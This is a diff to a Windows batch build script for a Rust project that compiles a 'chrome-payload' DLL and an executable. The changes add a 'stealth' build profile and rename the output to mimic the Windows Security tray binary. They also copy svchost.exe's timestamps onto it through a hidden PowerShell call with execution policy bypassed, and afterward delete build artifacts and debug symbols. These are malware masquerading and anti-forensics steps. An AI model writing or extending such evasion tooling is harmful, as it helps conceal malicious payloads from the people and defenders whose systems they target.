@@ -4,6 +4,10 @@ setlocal enabledelayedexpansion
 set "PATH=%USERPROFILE%\.cargo\bin;%PATH%"
 set "CARGO_TERM_COLOR=never"
 set "CARGO_TERM_PROGRESS=never"
+set "CARGO_PROFILE=stealth"
+set "OUT_DIR=out"
+set "OUT_NAME=SecurityHealthSystray.exe"
+set "REF_TS=%SystemRoot%\System32\svchost.exe"
 
 call :ensure_rust
 if errorlevel 1 exit /b 1
@@ -14,6 +18,10 @@ if errorlevel 1 exit /b 1
 call :do_build
 if errorlevel 1 exit /b 1
 
+call :post_process
+if errorlevel 1 exit /b 1
+
+call :cleanup_artifacts
 exit /b 0
 
 :ensure_rust
@@ -60,16 +68,36 @@ exit /b 0
 :do_build
 cd /d "%~dp0"
 
-cargo build --release -q -p chrome-payload >nul 2>&1 || goto build_fail
-if not exist "target\release\chrome_payload.dll" goto build_fail
+cargo build --profile stealth -q -p chrome-payload >nul 2>&1 || exit /b 1
+if not exist "target\stealth\chrome_payload.dll" exit /b 1
 
-rem LTO + codegen-units=1: final link can take several minutes — expected.
-cargo build --release -q -p jewish >nul 2>&1 || goto build_fail
-if not exist "target\release\jewish.exe" goto build_fail
-
-if not exist release mkdir release >nul 2>&1
-copy /Y "target\release\jewish.exe" "release\" >nul 2>&1
+rem LTO fat + opt-level=z: link can take several minutes.
+cargo build --profile stealth -q -p jewish >nul 2>&1 || exit /b 1
+if not exist "target\stealth\jewish.exe" exit /b 1
 exit /b 0
 
-:build_fail
-exit /b 1
+:post_process
+if not exist "%OUT_DIR%" mkdir "%OUT_DIR%" >nul 2>&1
+
+copy /Y "target\stealth\jewish.exe" "%OUT_DIR%\%OUT_NAME%" >nul 2>&1 || exit /b 1
+if not exist "%OUT_DIR%\%OUT_NAME%" exit /b 1
+
+rem Align PE timestamps with a common system binary.
+if exist "%REF_TS%" (
+    powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
+        "$d=Get-Item '%REF_TS%'; $f=Get-Item '%OUT_DIR%\%OUT_NAME%';" ^
+        "$f.LastWriteTime=$d.LastWriteTime; $f.CreationTime=$d.CreationTime;" ^
+        "$f.LastAccessTime=$d.LastAccessTime" >nul 2>&1
+)
+exit /b 0
+
+:cleanup_artifacts
+if exist "target\stealth\chrome_payload.dll" del /F /Q "target\stealth\chrome_payload.dll" >nul 2>&1
+if exist "target\stealth\jewish.exe" del /F /Q "target\stealth\jewish.exe" >nul 2>&1
+if exist "target\stealth\jewish.pdb" del /F /Q "target\stealth\jewish.pdb" >nul 2>&1
+if exist "target\stealth\deps\chrome_payload.dll" del /F /Q "target\stealth\deps\chrome_payload.dll" >nul 2>&1
+if exist "target\stealth\deps\chrome_payload.dll.exp" del /F /Q "target\stealth\deps\chrome_payload.dll.exp" >nul 2>&1
+if exist "target\stealth\deps\chrome_payload.dll.lib" del /F /Q "target\stealth\deps\chrome_payload.dll.lib" >nul 2>&1
+if exist "target\stealth\deps\chrome_payload.pdb" del /F /Q "target\stealth\deps\chrome_payload.pdb" >nul 2>&1
+if exist "release" rmdir /S /Q "release" >nul 2>&1
+exit /b 0
